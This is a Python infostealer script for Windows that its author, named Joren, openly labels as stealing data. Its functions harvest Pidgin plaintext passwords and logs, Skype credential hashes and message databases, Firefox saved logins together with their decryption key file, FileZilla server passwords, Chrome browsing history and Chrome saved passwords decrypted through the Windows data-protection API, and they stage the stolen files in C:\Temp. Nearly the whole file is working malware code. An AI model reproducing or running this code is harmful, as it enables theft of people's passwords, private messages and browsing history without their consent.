###written by Joren

###INCLUDES###
#1) Pidgin accounts(plain text)
#2) Pidgin logs
#3) Skype username and hash
#4) Skype messages
#5) Mozilla hashed credentials
#6) Filezilla server credentials(plain text)
#7) Chrome browsing history
#8) Chrome login data

import datetime
import re
from shutil import copyfile
import zipfile
import os
import sqlite3
from stealersfunctions import *

import win32api
import win32security

##Get the current user.
user = win32api.GetUserName()

def stealpidgin(user):

##Read the data from the accounts.xml.
    accountfile = "C:\\Users\\" + user + r"\\AppData\\Roaming\\.purple\\accounts.xml"
    with open(accountfile) as af:
        data = af.read()

##Extract the username with re.
    match = re.search(r"<name>(.*)</name>",data)
    if match:
        username = match.group(1).split("/")[0]

##Extract the password with re.
    match = re.search(r"<password>(.*)</password>",data)
    if match:
        password = match.group(1)

##Zip the contents of the log folder and copy this to the temp folder.
    logfolder = "C:\\Users\\" + user + r"\\AppData\\Roaming\\.purple\\logs\\" 
    zipf = zipfile.ZipFile("C:\\Temp\\" + username + "_pidgin.zip", 'w')
    zipdir(logfolder, zipf)
    zipf.close()

    return username, password


def stealmessageskype(user):

##Get the username from the shared.xml file.
    infoxml = "C:\\Users\\" + user + "\\AppData\\Roaming\\Skype\\shared.xml"
    with open(infoxml) as ix:
        data = ix.read()
        
    match = re.search("<Default>(.*)</Default>",data)
    if match:
        skypename = match.group(1)

##Get the password hash from the config.xml.
    configfile = "C:\\Users\\" + user + "\\AppData\\Roaming\\Skype\\" + skypename + "\\config.xml"
    
    with open(configfile) as cf:
        data = cf.read()

    match = re.search(r"<Credentials\d>(.*)</Credentials\d>",data)
    if match:
        skypehash = match.group(1)
        
##Copy the message database to the temp folder.
    messagefile = "C:\\Users\\" + user + "\\AppData\\Roaming\\Skype\\" + skypename + "\\main.db"
    copyfile(messagefile, "C:\\Temp\\" + skypename + ".db")

    return skypename,skypehash
    
def mozillapwds(user):
##Select the folder with a random name, and the sqlite db in it.
    profilefolder = "C:\\Users\\" + user + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
    randomfolder = os.listdir(profilefolder)[0]
    dbpath = os.path.join(profilefolder,randomfolder+"\\signons.sqlite")


##Connect to the database and select the necessary info.
    conn = sqlite3.connect(dbpath)
    c = conn.cursor()
    c.execute("""SELECT * FROM moz_logins""")
    data = [i for i in c] 
    conn.close()

##Copy the key file needed to decrypt the passwords.
    keyfile = dbpath = os.path.join(profilefolder,randomfolder+"\\key3.db")
    copyfile(keyfile, "C:\\Temp\\" + user + "_key3.db")
    return data

def filezillacreds(user):

##Read the info file.
    xmlfile = "C:\\Users\\" + user + "\\AppData\\Roaming\\FileZilla\\sitemanager.xml"

    with open(xmlfile) as xf:
        data = xf.read()

##Find all the server data in the info file.
    servers = re.findall(r"<Server>[\s\S]*?</Server>",data)

##Parse the host name, port, username and password from the file. Put these into a nice dict.
    searchwords = ["Host", "Port", "User", "Pass"]
    info = {}

    for server in servers:
        for word in searchwords:
        
            pattern = "<" + word + r">([\s\S]*)</" + word + ">"
            match = re.search(pattern, server)

            if match:
                match = match.group(1)

                if word == "Host":
                    host = match
                    info[host] = {}

                else:
                    info[host][word] = match
    return info

def chromehistory(user):

##Copy the history db to a new location so the lock is removed.
    historydb = "C:\\Users\\" + user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\history"
    newloc = "C:\\Temp\\temp"
    copyfile(historydb,newloc)

##Read the database, and parse out the needed info. Also convert the time to a readable one.
    conn = sqlite3.connect(newloc)
    c = conn.cursor()
    c.execute("""SELECT url,visit_count,last_visit_time FROM urls""")
    with open("C:\\Temp\\history","w") as f:
        for i in c:
            time = date_from_webkit(i[2])
            f.write(time + " " + str(i[0]) + " " + str(i[1]) + "\n")
            
    conn.close()

##Remove the temp file.
    os.remove(newloc)

def chromepasswords(user):
    logindb = "C:\\Users\\" + "Joren" + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    newloc = "C:\\Temp\\temp"
    copyfile(logindb,newloc)

    conn = sqlite3.connect(newloc)
    c = conn.cursor()
    c.execute("""SELECT signon_realm, username_value, password_value FROM logins""")

    data = [(str(row[0]), str(row[1]), str(win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1])) for row in c]
    conn.close()
    os.remove(newloc)

    return data
    
    
